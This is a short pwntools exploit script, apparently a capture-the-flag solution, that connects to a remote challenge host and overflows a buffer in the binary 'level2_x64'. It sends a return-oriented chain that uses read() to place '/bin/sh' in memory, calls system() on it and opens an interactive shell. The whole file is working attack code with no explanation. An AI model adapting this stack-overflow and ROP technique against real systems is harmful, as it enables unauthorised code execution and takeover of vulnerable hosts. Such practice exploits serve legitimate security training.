from pwn import*
elf=ELF('./level2_x64')
p=remote('node4.buuoj.cn',27783)
#p=process('./level2_x64')
context.log_level='debug'
read=elf.plt['read']
system=elf.plt['system']
data=0x600a88
pop_rdi=0x4006b3
pop_rsi_r15=0x4006b1
p.recvuntil(b'Input:\n')
payload=b'a'*0x88+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(data)+p64(0)+p64(read)+p64(pop_rdi)+p64(data)+p64(system)
p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()